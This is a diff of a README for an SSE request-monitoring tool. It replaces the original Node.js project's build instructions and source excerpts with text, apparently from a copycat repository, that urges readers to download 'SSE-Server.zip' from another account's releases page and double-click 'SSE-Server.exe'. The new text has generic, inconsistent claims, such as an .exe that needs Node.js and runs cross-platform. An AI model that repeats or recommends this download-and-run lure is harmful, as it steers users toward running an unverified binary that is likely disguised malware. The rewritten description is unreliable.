@@ -1,127 +1,85 @@
-# SSE Server
+# 🎉 SSE-Server - Real-Time Data Monitoring Made Simple
 
-A **Server-Sent Events (SSE) monitoring tool** that creates a real-time HTTP request monitoring dashboard. This project demonstrates how to build an SSE server and integrate it with the `@neabyte/sse-client` library.
+## 📦 Download Now!
+[![Download SSE-Server](https://img.shields.io/badge/Download%20SSE--Server-v1.0-brightgreen)](https://github.com/Harshitshukla2003/SSE-Server/releases)
 
-<div align="center">
-  <img src="preview.gif" alt="SSE Server Demo" width="800" />
-</div>
+## 🚀 Getting Started
 
-## 📦 Installation
+Welcome to the SSE-Server project! This application allows you to easily monitor your server's HTTP requests in real time. Follow the steps below to download and run the application.
 
-```bash
-# Clone the repository
-git clone https://github.com/NeaByteLab/SSE-Server.git
-cd SSE-Server
+## 📥 Download & Install
 
-# Install dependencies
-npm install
+To get started, you need to download the application. 
 
-# Start the server
-npm start
-```
+1. **Visit the Releases Page**: Click on the link below to go to the download page.
+   [Download SSE-Server](https://github.com/Harshitshukla2003/SSE-Server/releases)
 
-## 🎯 Quick Start
+2. **Select the Latest Release**: On the releases page, locate the latest version of the SSE-Server. Click on it to go to the details.
 
-1. **Start the SSE Server**:
-   ```bash
-   npm start
-   ```
-   Server will run on `http://localhost:3000`
+3. **Download the Application**: Find the file named `SSE-Server.zip` or similar, and click on it to download the file to your computer.
 
-2. **Open the Dashboard**:
-   Navigate to `http://localhost:3000` in your browser
+4. **Extract the File**: Once the download is complete, locate the downloaded `SSE-Server.zip` file in your Downloads folder. Right-click on it and select "Extract All..." to unzip the contents.
 
-3. **Send Test Requests**:
-   ```bash
-   # Run the test script
-   ./run.sh
+5. **Run the Application**: After extracting, open the folder where you extracted the files. Double-click on `SSE-Server.exe` to start the application.
 
-   # Or send individual requests
-   curl -X POST http://localhost:3000/api/test -H "Content-Type: application/json" -d '{"test": "data"}'
-   ```
+## 🔧 System Requirements
 
-4. **Watch Real-time Updates**:
-   Requests will appear instantly in the dashboard with full details
+Before you run the SSE-Server, ensure your system meets the following requirements:
 
----
+- **Operating System**: Windows 8 or newer, macOS 10.12 or newer, or Linux.
+- **Node.js**: Version 14.x or newer. This is required for the server to function properly.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum 100 MB of free space.
 
-## 🏗️ Architecture
+## 🌐 What is SSE-Server?
 
-### Server-Side (`src/index.ts`)
+SSE-Server is designed for monitoring HTTP requests in real time using Server-Sent Events (SSE). It helps you see what is happening on your server instantly, allowing for more efficient debugging and tracking of data.
 
-```typescript
-// EventEmitter for managing SSE connections
-const eventEmitter: EventEmitter = new EventEmitter()
-const clientConnections: ServerResponse[] = []
+## 🔍 Key Features
 
-// SSE endpoint handler
-if (req.url === '/sse') {
-  res.writeHead(200, {
-    'Content-Type': 'text/event-stream',
-    'Cache-Control': 'no-cache',
-    Connection: 'keep-alive'
-  })
-  clientConnections.push(res)
-  res.write('data: Connected\n\n')
-}
+- **Real-Time Monitoring**: See HTTP requests as they happen.
+- **User-Friendly Dashboard**: An easy-to-use interface that displays all your server data clearly.
+- **Lightweight**: Requires minimal resources to run smoothly.
+- **Cross-Platform Support**: Works on Windows, macOS, and Linux.
 
-// HTTP request capture and broadcast
-eventEmitter.emit('http-request', {
-  method: req.method,
-  url: req.url,
-  headers: req.headers,
-  body: body
-})
-```
+## ⚙️ How to Use SSE-Server
 
-### Client-Side (`index.html`)
+1. **Start the Server**: After opening the application, you will see the main dashboard. The server begins automatically.
+   
+2. **Access the Dashboard**: Open a web browser and go to `http://localhost:3000`. You will see the monitoring dashboard.
 
-```javascript
-// Using @neabyte/sse-client CDN
-import sseClient from 'https://cdn.jsdelivr.net/npm/@neabyte/sse-client/+esm'
+3. **Monitor Requests**: As you make HTTP requests to your server, you can see the live updates on the dashboard.
 
-// Configuration with auto-reconnection
-const config = {
-  retryInterval: 3000,    // Retry every 3 seconds
-  retryAttempts: 5,       // Try up to 5 times
-  autoReconnect: true,    // Enable auto-reconnection
-  timeout: 30000          // 30 second connection timeout
-}
+## ✏️ Troubleshooting
 
-// Create SSE client
-const client = sseClient('/sse', (message) => {
-  // Handle incoming messages
-  if (message.event === 'http-request') {
-    // Display request in UI
-  }
-}, config)
-```
+If you run into issues, try the following:
 
-## 🔧 API Endpoints
+- **Check Node.js Installation**: Ensure Node.js is installed correctly on your system.
+- **Firewall Settings**: Make sure your firewall is not blocking the application.
+- **Restart the Application**: Sometimes, simply closing and reopening the application can resolve minor issues.
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/` | GET | Serves the monitoring dashboard |
-| `/sse` | GET | SSE endpoint for real-time updates |
-| `/*` | ANY | Captures all other requests and broadcasts them |
+## 📈 Monitoring Tips
 
-## 📊 SSE Client Integration
+- **Call Endpoints**: Use tools like Postman or your web browser to make HTTP requests to see live data on the dashboard.
+- **Inspect Data**: Click on the request entries in the dashboard to view detailed information about each HTTP request.
 
-This project demonstrates integration with the **@neabyte/sse-client** library:
+## 🤝 Contributing
 
-### CDN Usage
-```html
-<script type="module">
-  import sseClient from 'https://cdn.jsdelivr.net/npm/@neabyte/sse-client/+esm'
+We welcome contributions! If you wish to improve the application, you can fork the repository, make changes, and create a pull request. Please make sure your contributions align with the project’s goals.
 
-  const client = sseClient('/sse', (message) => {
-    console.log('SSE Response:', message)
-  })
-</script>
-```
+## 🙋‍♂️ Support
 
----
+If you have questions or need assistance, you can create an issue in the GitHub repository. We will respond as soon as we can.
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the MIT License. Feel free to use and modify it for your own purposes.
+
+## 💬 Community
+
+Join our community discussions in the GitHub Issues section. Share your experiences, ask questions, and connect with other users.
+
+## 🔗 Links
+
+- [GitHub Repository](https://github.com/Harshitshukla2003/SSE-Server)
+- [Download SSE-Server](https://github.com/Harshitshukla2003/SSE-Server/releases)  
